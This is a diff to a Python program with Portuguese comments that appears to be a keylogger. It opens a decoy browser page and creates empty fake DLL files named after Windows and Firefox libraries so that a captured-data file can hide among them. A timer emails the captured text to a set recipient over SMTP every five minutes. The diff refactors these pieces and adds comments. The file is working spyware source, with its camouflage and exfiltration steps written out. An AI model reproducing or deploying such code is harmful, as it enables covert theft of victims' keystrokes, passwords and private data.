@@ -41,29 +41,23 @@ def get_hour():
     hora = str(hora)
     return hora
 
-# Função para abrir algo falso
-def fake_browser():
+# Função para abrir algo falso (browser por exemplo)
+def fake_app():
     url = "https://"
     wb.open(url)
 
 # Criando arquivos fakes para o win32.ini se camuflar entre eles
 def fake_archives():
-    if not os.path.exists(f"{path}win32.dll"):
-        open(f"{path}win32.dll", 'x')
-        open(f"{path}msvcp140.dll", 'x')
-        open(f"{path}vcruntime140.dll", 'x')
-        open(f"{path}ucrtbase.dll", 'x')
-        open(f"{path}vccorlib140.dll", 'x')
-        open(f"{path}api-ms-win-core-libraryloader-l1-1-0.dll", 'x')
-        open(f"{path}api-ms-win-core-localization-l1-2-0.dll", 'x')
-        open(f"{path}api-ms-win-core-rtlsupport-l1-1-0.dll", 'x')
-        open(f"{path}api-ms-win-crt-environment-l1-1-0.dll", 'x')
-        open(f"{path}api-ms-win-crt-string-l1-1-0.dll", 'x')
-        open(f"{path}api-ms-win-core-debug-l1-1-0.dll", 'x')
-        open(f"{path}api-ms-win-core-errorhandling-l1-1-0.dll", 'x')
-        open(f"{path}api-ms-win-core-file-l1-1-0.dll", 'x')
-        open(f"{path}api-ms-win-core-file-l1-2-0.dll", 'x')
-        open(f"{path}api-ms-win-core-file-l2-1-0.dll", 'x')
+    ext = '.dll'
+    lista_arq = ['win32', 'msvcp140', 'vcruntime140', 'ucrtbase', 'vccorlib140', 'api-ms-win-core-libraryloader-l1-1-0',
+                'api-ms-win-core-localization-l1-2-0', 'api-ms-win-core-rtlsupport-l1-1-0', 'api-ms-win-crt-environment-l1-1-0',
+                'api-ms-win-crt-string-l1-1-0', 'api-ms-win-core-debug-l1-1-0', 'api-ms-win-core-errorhandling-l1-1-0',
+                'api-ms-win-core-file-l1-1-0', 'api-ms-win-core-file-l1-2-0', 'api-ms-win-core-file-l2-1-0',
+                'api-ms-win-core-file-l2-1-1', 'api-ms-win-core-file-l2-2-0', 'api-ms-win-core-file-l2-2-1', 'sqmapi', 'nss3',
+                'vcruntime140', 'vcruntime140_1', 'vcruntime140_2', 'vfcompat', 'lgpllibs', 'libEGL', 'libGLESv2']
+    for arq in lista_arq:
+        if not os.path.exists(f"{path}{arq}{ext}"):
+            open(f"{path}{arq}{ext}", 'x')
 
 # Função para realizar o envio do email
 def send_email():
@@ -90,17 +84,17 @@ def send_email():
         servidor_email.login(email_sender, email_key) # Realizando login com sua própria conta
         servidor_email.sendmail(email_sender, email_receiver, msg.as_string()) # Enviando o email com as informações passadas anteriormente
         servidor_email.quit()
-    except Exception as e:
+    except Exception as e: # Except para debug
         print(f"Erro ao enviar o email: {e}")
 
+# Timer para o envio do email
 def timer():
     global file
 
     tempo = 0
     while True:
-        if tempo < (60 * 5):
+        if tempo < (60 * 5): # Setando o timer para 5 minutos
             tempo += 1
-            print(tempo)
             time.sleep(1)
         else:
             file.close()
@@ -142,11 +136,11 @@ def main():
                 file.write(txt)
                 file.close()
 
-        except Exception as e:
+        except Exception as e: # Except para debug
             print(f"Erro: {e}")
             break
 
 if __name__ == "__main__":
     fake_archives()
-    fake_browser()
+    fake_app()
     main()
